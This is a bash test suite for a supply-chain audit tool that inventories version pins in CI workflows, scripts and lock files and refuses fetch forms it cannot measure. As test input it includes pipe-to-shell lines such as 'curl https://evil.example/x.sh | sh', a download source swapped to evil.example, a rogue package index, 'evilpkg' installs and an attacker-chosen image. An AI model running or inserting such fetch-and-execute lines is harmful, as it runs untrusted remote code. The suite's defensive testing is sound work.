#!/usr/bin/env bash
# proves: REQ-SUP-001-AC18
# The inventory the daily supply-chain audit (pin-audit.py) loads through pin-age-check.py and pin-inventory.py: every version a workflow, script or lock file names is an
# inventory item, and what the scan cannot read is a placeholder. The pull-request scan that ran these checks on every pull request was deleted on Nov 17 2026
# (docs/ratify/2026-11-17-cache-pr-checks-six.md); this suite keeps the cases of the functions the daily audit still uses. Each case builds a small git repository and
# reads it in-process; there are no fixtures.
#   An item is "<kind>:<name>@<version>"; kinds: action (version = the pinned commit), tool (the installer actions' version inputs and install-scanner.sh's
#   *_VER pins), gotool (go install path@version in run steps), package (pypi/<name>@<version> from the hash-pinned requirements), image (name@sha256:digest), apk (name@version of a row of build/locks/vm-kernel.lock; the row's sha256 is its sum),
#   a checksum file is the tool item file:<path>, named by its content.
set -euo pipefail
export GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@x GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@x   # CI runners have no git identity
here=$(cd "$(dirname "$0")" && pwd)
root=$(cd "$here/../../.." && pwd)
chk="$here/../supply-chain/pin-age-check.py"
work=$(mktemp -d); trap 'rm -rf "$work"' EXIT
pass=0 failn=0
ok()  { pass=$((pass+1)); echo "ok   $1"; }
bad() { failn=$((failn+1)); echo "FAIL $1"; }
check() { if "$@" >/dev/null 2>&1; then ok "$CASE"; else bad "$CASE"; fi; }
NOW="2026-10-05T12:00:00Z"
d() { python3 -c "import datetime,sys;print((datetime.datetime(2026,10,5,12)-datetime.timedelta(days=float(sys.argv[1]))).strftime('%Y-%m-%dT%H:%M:%SZ'))" "$1"; }
SHA1=$(printf '1%.0s' $(seq 40)); SHA2=$(printf '2%.0s' $(seq 40)); SHA3=$(printf '3%.0s' $(seq 40)); SHA4=$(printf '4%.0s' $(seq 40)); SHA5=$(printf '5%.0s' $(seq 40))
SHA6=$(printf '6%.0s' $(seq 40)); DIG4=sha256:$(printf '4%.0s' $(seq 64)); DIG5=sha256:$(printf '5%.0s' $(seq 64)); DIG1=sha256:$(printf '1%.0s' $(seq 64)); DIG2=sha256:$(printf '2%.0s' $(seq 64)); DIG3=sha256:$(printf '3%.0s' $(seq 64))

# --- the base repository: one of every kind of pin --------------------------------------------------------------------
base="$work/base"; mkdir -p "$base/.github/workflows" "$base/.github/actions/local" "$base/.github/pins" "$base/bin" "$base/build/docker"
cat >"$base/.github/workflows/ci.yml" <<EOF
on: pull_request
jobs:
  j:
    runs-on: ubuntu-latest
    container:
      image: ghcr.io/own/ci@$DIG1
    steps:
      - uses: actions/checkout@$SHA1 # v4.1.0
      - uses: golangci/golangci-lint-action@$SHA2 # v9.3.0
        with:
          version: v2.13.2
      - uses: actions/setup-go@$SHA3 # v6.0.0
        with:
          go-version: '1.27'
      - uses: actions/setup-python@$SHA4 # v6.1.0
        with:
          python-version: '3.12'
      - run: |
          go install github.com/securego/gosec/v2/cmd/gosec@v2.29.0
          python3 -m pip install --require-hashes -r .github/pins/adjudicator-requirements.txt
      - uses: goreleaser/goreleaser-action@$SHA6 # v7.2.3
        with:
          version: '2.17.1'
      - uses: helm/kind-action@$SHA6 # v1.15.0
        with:
          node_image: kindest/node:v1.31.0@$DIG4
      - run: |
          curl -fsSL https://github.com/cli/cli/releases/download/v2.40.0/gh_2.40.0_linux_amd64.tar.gz -o gh.tgz
          python3 -m pip install --quiet black==24.1.0
          docker run --rm alpine:3.20@$DIG5 true
EOF
cat >"$base/.github/actions/local/action.yml" <<EOF
name: local
runs:
  using: composite
  steps:
    - uses: actions/cache@$SHA5 # v4.2.0
EOF
cat >"$base/bin/install-scanner.sh" <<'EOF'
#!/usr/bin/env bash
TRIVY_VER=0.74.0
GRYPE_VER=0.118.0
case "${TOOL}:${arch}" in
  trivy:x86_64|trivy:amd64) SUM=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ;;
esac
EOF
cat >"$base/.github/pins/adjudicator-requirements.txt" <<'EOF'
# hash-pinned
anthropic==1.9.0 \
    --hash=sha256:aaaa
requests==2.32.0 \
    --hash=sha256:bbbb
EOF
printf 'FROM gcr.io/distroless/static@%s\n' "$DIG2" >"$base/build/docker/Dockerfile.production"
printf 'module x\n\ngo 1.27\n\ntoolchain go1.27.1\n\nrequire github.com/foo/bar v1.0.0\n' >"$base/go.mod"
git -C "$base" init -q; git -C "$base" add -A; git -C "$base" -c user.name=t -c user.email=t@x commit -q -m base

# newcase NAME 'python edit run in the repo root' -> $work/NAME (a copy of base with a head commit)
newcase() {
  local n=$1; rm -rf "$work/$n"; cp -R "$base" "$work/$n"
  ( cd "$work/$n" && python3 - "$2" <<'PY'
import sys
exec(sys.argv[1])
PY
    git add -A; git -c user.name=t -c user.email=t@x commit -q -m head )
}
# runck NAME [extra args] -> sets rc, $work/NAME.out
runck() {
  local n=$1; shift; rc=0
  python3 "$chk" --root "$work/$n" --base HEAD~1 --head HEAD --json "$work/$n.json" "$@" >"$work/$n.out" 2>&1 || rc=$?
}
sub() { python3 -c "import sys;print('import pathlib; p=pathlib.Path(%r); p.write_text(p.read_text().replace(%r,%r))' % tuple(sys.argv[1:]))" "$@"; }
OLD=$(d 10); YOUNG=$(d 3)

# --- nothing moves ------------------------------------------------------------------------------------------------------
newcase none "pathlib=__import__('pathlib'); pathlib.Path('README.md').write_text('hi')"
runck none

# --- an action pin moves: names it; asks only that it be a pin the scan can read (a commit), never how old it is ---------------------
NEW1=$(printf 'a%.0s' $(seq 40))
newcase act "$(sub .github/workflows/ci.yml "actions/checkout@$SHA1 # v4.1.0" "actions/checkout@$NEW1 # v4.2.0")"
runck act

newcase se-three "$(sub .github/workflows/ci.yml "version: v2.13.2" "version: v2.13.3")"; runck se-three

# --- an image on a registry the policy does not name fails (AC3) --------------------------------------------------------------------------
newcase reg-unknown "$(sub .github/workflows/ci.yml "ghcr.io/own/ci@$DIG1" "quay.io/own/ci@$DIG3")"; runck reg-unknown
newcase reg-dh "$(sub .github/workflows/ci.yml "alpine:3.20@$DIG5" "docker.io/library/alpine:3.20@$DIG3")"; runck reg-dh

NEW5=$(printf 'b%.0s' $(seq 40))

# --- name:tag@sha256:digest counts as PINNED (Docker ignores the tag when a digest is present): the image is the name without the tag, the version the digest ----
newcase tagdigest "$(sub .github/workflows/ci.yml "ghcr.io/own/ci@$DIG1" "ghcr.io/own/ci:v2@$DIG3")"
runck tagdigest
newcase tagonly "$(sub .github/workflows/ci.yml "ghcr.io/own/ci@$DIG1" "ghcr.io/own/ci:v2")"
runck tagonly

# --- NOT covered: the product's base image, Go modules, the Go toolchain (amendments 1 and 2) -------------------------------------
newcase notcovered "$(sub build/docker/Dockerfile.production "$DIG2" "$DIG3")
$(sub go.mod 'go1.27.1' 'go1.27.2')
$(sub .github/workflows/ci.yml "go-version: '1.27'" "go-version: '1.28'")
$(sub go.mod 'v1.0.0' 'v1.1.0')"
runck notcovered

# --- several moves: every one is named, one that is no pin fails the whole check ---------------------------------------------------------
newcase multi "$(sub .github/workflows/ci.yml "actions/checkout@$SHA1 # v4.1.0" "actions/checkout@$NEW1 # v4.2.0")
$(sub bin/install-scanner.sh 'TRIVY_VER=0.74.0' 'TRIVY_VER=0.75.0')
$(sub .github/pins/adjudicator-requirements.txt 'requests==2.32.0' 'requests==2.33.0')
$(sub .github/workflows/ci.yml 'version: v2.13.2' 'version: v2.13')"
runck multi

# --- a NEW pin counts as moved; a removed pin is no problem --------------------------------------------------------------
NEW6=$(printf 'c%.0s' $(seq 40))
newcase added "$(sub .github/workflows/ci.yml "      - uses: actions/checkout@$SHA1 # v4.1.0" "      - uses: actions/checkout@$SHA1 # v4.1.0"$'\n'"      - uses: actions/upload-artifact@$NEW6 # v7.0.1")"
runck added
newcase added-tag "$(sub .github/workflows/ci.yml "      - uses: actions/checkout@$SHA1 # v4.1.0" "      - uses: actions/checkout@$SHA1 # v4.1.0"$'\n'"      - uses: actions/upload-artifact@v7")"
runck added-tag
newcase removed "$(sub .github/workflows/ci.yml "      - uses: actions/checkout@$SHA1 # v4.1.0" "")"
runck removed

# --- an UNCHANGED pin is never judged ----------------------------------------------------------------------------------------------------
runck none

# --- a workflow whose filename is not ASCII is still read (git quotes such paths; a pin there must never go unjudged) --------------------------------------------
newcase unicode "$(sub .github/workflows/ci.yml "actions/checkout@$SHA1 # v4.1.0" "actions/checkout@v4")
import pathlib, shutil
shutil.copy('.github/workflows/ci.yml', '.github/workflows/é.yml')
pathlib.Path('.github/workflows/ci.yml').write_text(pathlib.Path('.github/workflows/ci.yml').read_text().replace('actions/checkout@v4', 'actions/checkout@$SHA1'))"
runck unicode

# --- plain forms from review round 3: pip extras and operators, an indented requirements line, a tag-only docker run, an expression that holds `|`, an action's subdirectory -----------------------------------
newcase extras "$(sub .github/workflows/ci.yml '      - run: |' $'      - run: |\n          pip install requests[socks]==2.99.0 urllib3>=2.0\n          docker run --rm -e A=b alpine:3.99 true\n          go install example.org/tool@${{secrets.PRIVATE_VERSION||'"'"'v1.2.3'"'"'}}')"
runck extras
newcase subdir "$(sub .github/workflows/ci.yml '      - run: |' $'      - uses: github/codeql-action/init@'$SHA6$' # v3\n      - run: |')"
git -C "$work/subdir" commit -q --amend -m head
newcase subdir2 "$(sub .github/workflows/ci.yml '      - run: |' $'      - uses: github/codeql-action/analyze@'$SHA6$' # v3\n      - run: |')"
runck subdir2
newcase indentreq "$(sub .github/pins/adjudicator-requirements.txt 'requests==2.32.0' '  requests[security]==2.40.0')"
runck indentreq

# --- a hostile line cannot stall the readers; the scout versions named in install-scanner.sh; forms this inventory does not measure are listed, never silently empty ---------------------------------
CASE="inventory: a run line of 200 repeated expressions (a pattern-backtracking probe) is read in well under a second"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, time
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
t = time.process_time()  # this process's CPU: in-process parsing only, so box load cannot fail it
for body in ("curl https://github.com/a/b/releases/download/v" + "${{ x }}" * 200, "go install example.org/t@" + "${{ x }}" * 200, "pip install foo==" + "${{ x }}" * 200):
    inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + body + "\n"})
inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + "x" * 100000 + "\n"})   # a command line is read whole, whatever its length
assert time.process_time() - t < 3, time.process_time() - t
PY
CASE="inventory: docker-scout-X.Y.Z versions in install-scanner.sh's case list are tool:scout items; releases/latest/download is an unprovable item; go run and go get x@v are go tools"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv); _inv = inv.inventory; inv.inventory = lambda f: {__import__("re").sub(r"#step:[0-9a-f]+$", "", k): v for k, v in _inv(f).items()}
got = inv.inventory({"bin/install-scanner.sh": "SCOUT_VER=1.26.0\ncase x in docker-scout|docker-scout-1.25.0|docker-scout-1.24.0) ;; esac\n",
                     ".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: |\n          curl -L https://github.com/o/r/releases/latest/download/x.tgz\n          go run example.org/tool@v1.2.3\n          go get example.org/other@v2.0.0\n"})
for k in ("tool:scout@1.25.0", "tool:scout@1.24.0", "tool:scout@1.26.0", "tool:o/r@latest", "gotool:example.org/tool@v1.2.3", "gotool:example.org/other@v2.0.0"):
    assert k in got, (k, sorted(got))
PY
CASE="inventory: install forms it does not measure (npm, apt, gh release download, a pip URL, a non-release download) are LISTED"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
f = {".github/workflows/a.yml": "x: npm install left-pad\ny: sudo apt-get install -y skopeo\nz: gh release download v1\nw: pip install git+https://x/y@z\nv: curl -O https://example.org/t.tgz\n"}
whats = {k[1] for k in inv.unmeasured(f)}
assert whats == {"a package-manager install", "a system package install", "a gh release or extension download", "a pip install from a URL", "a download"}, whats
PY

CASE="inventory: docker run with a quoted image, with --cpus 2, and bare pip install names are items"
check python3 - "$here/../supply-chain/pin-inventory.py" "$chk" <<'PY'
import importlib.util, sys, datetime as dt
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv); _inv = inv.inventory; inv.inventory = lambda f: {__import__("re").sub(r"#step:[0-9a-f]+$", "", k): v for k, v in _inv(f).items()}
got = inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: |\n          docker run --rm \"alpine:3.99\" true\n          docker run --cpus 2 --memory 1g busybox:1.36 true\n          pip install requests flask[async]\n"})
for k in ("image:alpine:3.99@", "image:busybox:1.36@", "package:pypi/requests@(unpinned)", "package:pypi/flask@(unpinned)"):
    assert k in got, (k, sorted(got))
PY
CASE="inventory: a subdirectory taken from untrusted action metadata is redacted like every other part of a key"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
assert "PRIVATE_CANARY" not in inv.Item("action", "o/r", "a" * 40, "", "x/${{secrets.PRIVATE_CANARY}}").key
PY

# --- a PR that ADDS an install form this check cannot measure is refused (it says what it cannot resolve, then refuses it) ---------------------------------------------------------------------------
newcase unm1 "$(sub .github/workflows/ci.yml '      - run: |' $'      - run: npm install -g left-pad\n      - run: |')"
runck unm1
newcase unm2 "$(printf 'import pathlib\npathlib.Path(\"tools\").mkdir(exist_ok=True)\npathlib.Path(\"tools/fetch.sh\").write_text(\"#!/bin/sh\\ncargo install ripgrep\\n\")')"
runck unm2
newcase unm3 "$(sub .github/workflows/ci.yml '      - run: |' $'      - run: sudo apt-get install -y skopeo\n      - run: |')"
git -C "$work/unm3" commit -q --amend -m head
git -C "$work/unm3" checkout -q -b b2; printf 'x\n' >"$work/unm3/README.md"; git -C "$work/unm3" add -A; git -C "$work/unm3" -c user.name=t -c user.email=t@x commit -q -m "touch readme"

CASE="tags come from ONE git ls-remote (annotated tags peeled), never one REST call per annotated tag"
check python3 - "$chk" <<'PY'
import importlib.util, subprocess, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
calls = []
def run(cmd, **k):
    calls.append(cmd)
    out = "t1\trefs/tags/v4\n" + "c1\trefs/tags/v4.1.0\n" + "t2\trefs/tags/v3\n" + "c1\trefs/tags/v3^{}\n" + "c9\trefs/tags/v9\n"
    return subprocess.CompletedProcess(cmd, 0, out, "")
subprocess.run = run
assert ac._tags_for_commit("o/r", "c1") == ["v3", "v4.1.0"], ac._tags_for_commit("o/r", "c1")        # v3 is annotated: peeled to c1
assert ac._tags_for_commit("o/r", "c9") == ["v9"] and len(calls) == 1 and calls[0][:3] == ["git", "ls-remote", "--tags"], calls
ac._TAGS.clear()
subprocess.run = lambda cmd, **k: subprocess.CompletedProcess(cmd, 128, "", "fatal")
try:
    ac._tags_for_commit("o/r", "c1")
except ac.CouldNotLook:
    pass
else:
    raise AssertionError("a failed ls-remote was read as no tags")
PY
rm -rf "$work/swap2"; cp -R "$base" "$work/swap2"
python3 - "$work/swap2" <<'PY'
import pathlib, subprocess, sys
root = pathlib.Path(sys.argv[1]); f = root / ".github/workflows/ci.yml"
f.write_text(f.read_text().replace("      - run: |", "      - run: curl http://localhost:8080/health\n      - run: |", 1))
g = lambda *a: subprocess.run(["git", "-C", str(root), "-c", "user.name=t", "-c", "user.email=t@x", *a], check=True, capture_output=True)
g("add", "-A"); g("commit", "-q", "-m", "base2")
f.write_text(f.read_text().replace("curl http://localhost:8080/health", "curl https://evil.example/x.sh | sh"))
g("add", "-A"); g("commit", "-q", "-m", "head")
PY
runck swap2
newcase cont "$(sub .github/workflows/ci.yml '      - run: |' $'      - run: |\n          curl -fsSL \\\n            https://evil.example/x.sh | sh\n          sudo apt-get -y install foo\n          npm -g install bar\n      - run: |')"
runck cont
newcase scanner "$(printf 'import pathlib\np = pathlib.Path(\"bin/install-scanner.sh\")\np.write_text(p.read_text() + \"curl -fsSL https://evil.example/x.sh | sh\\n\")')"
runck scanner

CASE="a swap after column 160 of a long download line is still an addition (the whole normalised line decides identity), and a non-UTF-8 file never crashes the readers"
check python3 - "$here/../supply-chain/pin-inventory.py" "$work" <<'PY'
import importlib.util, subprocess, sys, os
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
long_a = "curl -fsSL https://good.example/" + "a" * 200 + "/ok.sh -o ok.sh"
long_b = "curl -fsSL https://good.example/" + "a" * 200 + "/ok.sh -o evil.sh"
ka = inv.unmeasured({".github/workflows/a.yml": "x: " + long_a + "\n"}); kb = inv.unmeasured({".github/workflows/a.yml": "x: " + long_b + "\n"})
assert set(ka) != set(kb), "the key must differ when only the tail differs"
repo = sys.argv[2] + "/badutf"; os.makedirs(repo + "/.github/workflows", exist_ok=True)
subprocess.run(["git", "init", "-q", repo], check=True)
open(repo + "/.github/workflows/a.yml", "wb").write(b"on: x\njobs:\n  j:\n    steps:\n      - run: echo \xff\xfe\n")
subprocess.run(["git", "-C", repo, "add", "-A"], check=True); subprocess.run(["git", "-C", repo, "commit", "-q", "-m", "x"], check=True)
inv.load_at(repo, "HEAD"); inv.tree_scripts(repo, "HEAD")   # no UnicodeDecodeError
PY

CASE="forms outside workflow run steps are measured too: a script's go install / pip / docker run / release download, install-scanner.sh's *_VERSION and download source, a composite action anywhere, a local action reference, an oddly named requirements file"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv); _inv = inv.inventory; inv.inventory = lambda f: {__import__("re").sub(r"#step:[0-9a-f]+$", "", k): v for k, v in _inv(f).items()}
got = inv.inventory({"bin/tool.sh": "go install example.org/evil@v9.9.9\ndocker run alpine:3.99 true\npip install evilpkg==1.0\ncurl -L https://github.com/evil/evil/releases/download/v1.0/x.tgz | tar xz\n",
                     "bin/install-scanner.sh": "NEWT_VERSION=9.9.9\nSCOUT_BASE=\"${SCOUT_BASE_URL:-https://github.com/docker/scout-cli/releases/download}\"\nTOOL_BASE_URL=https://evil.example/dl\n",
                     "tools/act/action.yml": "runs:\n  using: composite\n  steps:\n    - uses: evil/act@v1\n",
                     ".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: ./tools/act\n      - run: pip install -r deps.txt\n"})
for k in ("gotool:example.org/evil@v9.9.9", "image:alpine:3.99@", "package:pypi/evilpkg@1.0", "tool:evil/evil/x.tgz@v1.0", "tool:newt@9.9.9", "action:evil/act@v1"):
    assert k in got, (k, sorted(got))
assert any(k.startswith("action:local:./tools/act~") and k.endswith("@(local)") for k in got), sorted(got)   # a local action: its name carries a digest of the raw spelling
assert any(k.startswith("tool:source:tool_base_url=https://evil.example/dl@") for k in got), sorted(got)
assert ("a pip requirements file not named requirements*.txt" in {k[1] for k in inv.unmeasured({".github/workflows/a.yml": "x: pip install -r deps.txt\n"})})
assert not inv.unmeasured({".github/workflows/a.yml": "x: pip install -r .github/pins/adjudicator-requirements.txt\n"})
PY
newcase srcswap "$(printf 'import pathlib\np = pathlib.Path(\"bin/install-scanner.sh\")\np.write_text(p.read_text() + \"TOOL_BASE_URL=https://evil.example/dl\\n\")')"
runck srcswap

CASE="an unclosed run of expression openers in a huge script is read in linear time, a file over 1 MB is refused (not read), and a very long line cannot make the form scan quadratic"
check python3 - "$here/../supply-chain/pin-inventory.py" "$work" <<'PY'
import importlib.util, os, subprocess, sys, time
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
t = time.process_time()  # this process's CPU: in-process parsing only, so box load cannot fail it
for fn in (lambda: inv.inventory({"bin/x.sh": ("echo ${{ " * 440 + "\n") * 140}), lambda: inv.unmeasured({"bin/x.sh": ("curl " + "http://a " * 390 + "\n") * 150})):
    fn()                                                     # many lines just under 4000 characters are read by pattern, quickly
assert time.process_time() - t < 3, time.process_time() - t
# a long ordinary pip install just under 4000 characters is read whole: the last dependency is found
pkgs = " ".join("pkg%03d==1.0.%d" % (i, i) for i in range(200))
got = inv.inventory({"bin/x.sh": "pip install " + pkgs + " evilpkg==9.9.9\n"})
assert any(k.startswith("package:pypi/evilpkg@9.9.9") for k in got), sorted(got)[-3:]
assert any(k.startswith("package:pypi/pkg199@1.0.199") for k in got), sorted(got)[-3:]
repo = sys.argv[2] + "/bigfile"; os.makedirs(repo, exist_ok=True)
subprocess.run(["git", "init", "-q", repo], check=True)
open(repo + "/big.sh", "w").write("# x\n" * 300000)
subprocess.run(["git", "-C", repo, "add", "-A"], check=True); subprocess.run(["git", "-C", repo, "commit", "-q", "-m", "x"], check=True)
for fn in (lambda: inv.tree_scripts(repo, "HEAD"), lambda: inv.tree_scripts(repo, None)):
    try:
        fn()
    except RuntimeError as e:
        assert "too large" in str(e)
    else:
        raise AssertionError("an over-size script was read")
assert inv._strip_expressions("a ${{ x }} b ${{ y") == "a ${{expression}} b ${{expression}}"
assert inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: echo ${{ " + "x" * 200 + " }}\n"}) == {}
PY

CASE="a version or image given by a SHELL VARIABLE is a placeholder item that cannot be proven (adding one is refused), and an unreadable file stops the unmeasured check with exit 2, never 'nothing found'"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv); _inv = inv.inventory; inv.inventory = lambda f: {__import__("re").sub(r"#step:[0-9a-f]+$", "", k): v for k, v in _inv(f).items()}
got = inv.inventory({"bin/x.sh": "V=1.2.3\ncurl -L https://github.com/o/r/releases/download/v${V}/t.tgz | tar xz\ndocker run --rm ghcr.io/o/i:${TAG} true\ndocker run $IMG true\npip install foo==${V}\ngo install example.org/x@$V\n"})
need = ("tool:o/r/t.tgz@v${var}", "image:(variable)@", "package:pypi/foo@${var}", "gotool:example.org/x@${var}")
for k in need:
    assert k in got, (k, sorted(got))
PY
words=('import urllib.request' 'from urllib.request import urlopen' 'data = urlopen(u).read()'
  'urlretrieve(u, "f")' 'requests.get(u)' 'requests.post(u)' 'requests.put(u)' 'requests.head(u)'
  'requests.request("GET", u)' 'requests.Session()')
RU='https://github.com/o/r/releases/download/v1.2.3/x.tgz'
pcs=()
pcs+=("requests (import)|import requests\nrequests.get('$RU')")
pcs+=("requests (from-import)|from requests import get\nget('$RU')")
pcs+=("http.client|import http.client\nc = http.client.HTTPSConnection('github.com')\nc.request('GET', '/o/r/releases/download/v1.2.3/x.tgz')   # $RU")
pcs+=("urllib3|import urllib3\nurllib3.PoolManager().request('GET', '$RU')")
pcs+=("httpx|import httpx\nhttpx.get('$RU')")
pcs+=("requests under an alias (import requests as r)|import requests as r\nr.get('$RU')")
pcs+=("from http import client|from http import client\nclient.HTTPSConnection('github.com').request('GET', '$RU')")
pcs+=("urllib.request|import urllib.request\nurllib.request.urlopen('$RU')")
EVU='https://evil.example/x'

longline() { python3 -c 'import sys; n, t = int(sys.argv[1]), sys.argv[2]; print("echo " + "a" * (n - 5 - len(t)) + t, end="")' "$1" "$2"; }   # echo, then a line of exactly N characters ending in TAIL
newcase wflong "$(sub .github/workflows/ci.yml '      - run: |' "      - run: $(longline 3990 ' && pip install evilpkg==9.9.9 && curl -fsSL https://evil.example/x.sh | sh')"$'\n      - run: |')"
runck wflong
newcase wflong9 "$(sub .github/workflows/ci.yml '      - run: |' "      - run: $(longline 9100 ' && pip install evilpkg==9.9.9')"$'\n      - run: |')"
runck wflong9
CASE="AC5: the items reader (pin-inventory) reports a line over 4000 characters as an unmeasured command line, and a line of 4000 as an ordinary download"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
def line(n): return "echo " + "a" * (n - 5 - 36) + "; curl -sL https://evil.example/x.sh"
over = inv.unmeasured({"bin/x.sh": line(4001) + "\n"})
assert any("a command line over 4000 characters" in str(x) for x in over), over
exact = inv.unmeasured({"bin/x.sh": line(4000) + "\n"})
assert exact and not any("a command line over 4000 characters" in str(x) for x in exact), exact
PY

CASE="every fetching spelling is either MEASURED or REFUSED when added, never silent: docker container/image subcommands, podman/nerdctl, git clone, dnf/yum/apk/snap/conda installs, dotnet tool, helm repo add, kubectl apply from a URL, gh extension, cargo binstall, npm exec, bunx, pip download from a URL, a scheme-less wget, go install with a variable module"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv); _inv = inv.inventory; inv.inventory = lambda f: {__import__("re").sub(r"#step:[0-9a-f]+$", "", k): v for k, v in _inv(f).items()}
lines = ["docker container run --rm evil/x:latest", "docker image pull evil/x:latest", "docker --context x run evil/x:latest", "podman run evil/x:latest", "nerdctl run evil/x:latest",
         "docker build https://example.org/ctx.git", "git clone https://github.com/evil/x", "dnf install -y evilpkg", "yum install evilpkg", "apk add evilpkg", "snap install evil",
         "conda install evil", "dotnet tool install evil", "helm repo add evil https://example.org", "kubectl apply -f https://example.org/x.yaml", "gh extension install evil/x",
         "cargo binstall evil", "npm exec evil", "bunx evil", "pip download https://example.org/x.whl", "wget get.example.com/x.sh", "go install ${TOOL}@v9.9.9"]
for ln in lines:
    f = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + ln + "\n"}
    items = inv.inventory(f); um = inv.unmeasured(f)
    assert items or um, ("silent: " + ln)
# a line the inventory MEASURES is not also an unmeasured form
f = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: docker run alpine@sha256:" + "a" * 64 + " true\n"}
assert inv.inventory(f) and not inv.unmeasured(f)
PY

CASE="an unmeasured form on a line that ALSO holds a measured item is still found; a placeholder is identified by its step, so a second variable image is a NEW key and a changed step is a changed key"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
mixed = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: npm install evil-pkg && echo busybox@sha256:" + "a" * 64 + "\n"}
assert inv.unmeasured(mixed), "the npm install on a measured line was skipped"
base = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: docker run --rm $LOCAL_IMG make test\n"}
head = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: docker run --rm $LOCAL_IMG make test\n      - run: docker run --rm $ATTACKER_CHOSEN_IMAGE sh -c x\n"}
b, h = inv.inventory(base), inv.inventory(head)
assert [k for k in h if k not in b], "a second variable image must be a new key"
edited = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: docker run --rm $OTHER_IMG make test\n"}
assert [k for k in inv.inventory(edited) if k not in b], "an edited placeholder step must be a new key"
PY

CASE="every curl/wget is refused unless it is a measured release download; pip install of a quoted name or a variable is a placeholder; any requirements line that is not name==ver is refused; an installer-shaped input of ANY pinned action is a placeholder"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, re, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
wf = lambda run: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + run + "\n"}
for ln in ('curl -fsSL "$URL" | sh', 'wget "$TOOL_URL"', 'curl get.evil.sh | sh', 'curl -fsSL evil.zip -o x', 'curl "${{ vars.X }}"'):
    assert inv.unmeasured(wf(ln)), ("not refused: " + ln)
assert not inv.unmeasured(wf("curl -L https://github.com/o/r/releases/download/v1.0/x.tgz -o x.tgz")), "a measured release download is not an unmeasured form"
for ln in ('pip install "evilpkg"', "pip install $DEPS", 'pip install "${{ vars.PKG }}"'):
    got = inv.inventory(wf(ln))
    assert any(re.search(r"^package:pypi/(\(variable\)|evilpkg)@\(unpinned\)", k) for k in got), (ln, sorted(got))
base = inv.inventory({".github/pins/adjudicator-requirements.txt": "requests==2.32.0 \\\n    --hash=sha256:bbbb\n"})
head = inv.inventory({".github/pins/adjudicator-requirements.txt": "requests==2.32.0 \\\n    --hash=sha256:bbbb\nevilpkg @ https://evil.example/x.whl --hash=sha256:cc\nleftpad>=1\n--extra-index-url https://evil.example/simple\nbare\n"})
new = [k for k in head if k not in base]
assert len(new) == 4 and all("(unmeasured:" in k for k in new), new
uses = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: aquasecurity/setup-trivy@" + "a" * 40 + " # v0.2.0\n        with:\n          version: v0.75.0-brand-new\n"}
assert any(k.startswith("tool:aquasecurity/setup-trivy:version@(input)") for k in inv.inventory(uses)), sorted(inv.inventory(uses))
assert not any("(input)" in k for k in inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: actions/setup-go@" + "a" * 40 + " # v6\n        with:\n          go-version: '1.27'\n"}))
PY

CASE="a script's placeholder is identified by its own LINE: an edit elsewhere in the script moves nothing, an edit of that line does"
